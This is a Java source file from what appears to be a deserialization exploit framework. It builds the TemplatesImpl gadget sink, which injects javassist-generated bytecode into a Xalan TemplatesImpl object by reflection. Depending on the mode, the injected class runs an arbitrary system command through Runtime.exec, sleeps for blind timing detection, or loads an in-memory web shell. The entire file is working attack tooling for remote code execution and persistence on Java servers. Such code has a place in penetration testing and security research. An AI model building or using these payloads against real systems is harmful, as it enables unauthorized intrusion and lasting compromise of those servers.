package com.ppp.sinks;

import com.ppp.JavaClassHelper;
import com.ppp.JavaClassScheduler;
import com.ppp.scheduler.MemShellScheduler;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.ClassFiles;
import com.ppp.utils.Gadgets;
import com.ppp.utils.Reflections;
import com.ppp.utils.maker.JavaClassUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

/**
 * @author Whoopsunix
 */
@Sink({Sink.TemplatesImpl})
public class TemplatesImpl {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RUNTIME, EnchantType.DEFAULT})
    public Object runtime(SinksHelper sinksHelper) throws Exception {
        String className = "RuntimeD";

        String command = sinksHelper.getCommand();

        ClassPool pool = ClassPool.getDefault();

        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
        ctClass.addConstructor(ctConstructor);

        // 设置 serialVersionUID
        JavaClassUtils.fieldChangeIfExist(ctClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");
        ctClass.defrost();
        ctClass.addField(CtField.make("private static final long SerialVersionUIDDemo = 8207363842866235160L;", ctClass));

        // 是否继承 AbstractTranslet
        extendsAbstractTranslet(ctClass, sinksHelper);


        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
        return templatesImpl;
    }


    /**
     * 线程延时
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Sleep})
    public Object sleep(SinksHelper sinksHelper) throws Exception {
        String className = "SleepD";

        Long sleepTime = sinksHelper.getSleepTime();
        String sleep = sinksHelper.getSleep();

        String code;
        ClassPool pool = ClassPool.getDefault();
        if (sleep != null && sleep.equalsIgnoreCase("timeunit")) {
            sleepTime *= 1000L;
            code = "java.lang.Thread.sleep((long)" + sleepTime + ");";
        } else {
            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + sleepTime + ");";
        }
        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(code);
        ctClass.addConstructor(ctConstructor);


        // 是否继承 AbstractTranslet
        extendsAbstractTranslet(ctClass, sinksHelper);

//        new BASE64Encoder().encode(ctClass.toBytecode());
        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
        return templatesImpl;
    }


    /**
     * 内存马
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.MEMSHELL})
    public Object memShell(SinksHelper sinksHelper) throws Exception {
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        byte[] classBytes = JavaClassScheduler.build(javaClassHelper);

        Object templatesImpl = createTemplatesImpl(classBytes);
        return templatesImpl;
    }


    /**
     * 是否继承 AbstractTranslet
     *
     * @param ctClass
     * @param sinksHelper
     * @throws Exception
     */
    public static void extendsAbstractTranslet(CtClass ctClass, SinksHelper sinksHelper) throws Exception {
        if (!sinksHelper.isExtendsAbstractTranslet()) {
            return;
        }
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superCtClass);
    }


    public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    classBytes,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static <T> T createTemplatesImpl(byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
            throws Exception {
        final T templates = tplClass.newInstance();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                classBytes, ClassFiles.classAsBytes(Gadgets.PPP.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        // 满足条件 1. classCount也就是_bytecodes的数量大于1   2. _transletIndex >= 0  可去掉 AbstractTranslet
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
}
